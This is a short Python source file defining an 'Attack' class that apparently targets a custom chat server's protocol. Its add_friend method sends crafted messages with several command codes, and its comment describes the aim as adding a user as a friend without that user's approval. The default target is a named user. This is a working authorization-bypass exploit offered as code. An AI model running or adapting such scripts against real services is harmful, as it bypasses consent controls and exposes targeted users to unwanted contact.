from tools import *


class Attack(tools):


    @classmethod
    def add_friend(cls, target_screen_name = "natali 1f") -> None:
        # ---------------------------------------------- #
        # This function that adds friend ( not needs of approved)
        # :param sock: the socket
        # :param user_id: the user id of the friend you want
        # :param my_id: your id
        # :return: none
        # ---------------------------------------------- #

        my_id = super().server_session.id
        target_id = super().find_user_id_by_name(super().server_session.sock, target_screen_name)
        for i in range(400, 430, 10):
            data = [my_id, target_id]
            request = f"{str(i)}#{super()._data_start}{json.dumps(data)}{super()._msg_ending}"
            ans = cls.send(request, super().server_session.sock)
            print(f"[SERVER RESPONSE] {ans}")


    @classmethod
    def send(cls, client_msg, sock) -> str:
        # ---------------------------------------------- #
        # This function sends friend the request and return the answer
        # :param client_msg: the request
        # :param sock: socket
        # :return: the answer
        # :rtype: str
        # ---------------------------------------------- #

        sock.sendall(client_msg.encode())
        msg = sock.recv(1024)
        msg = msg.decode()
        return msg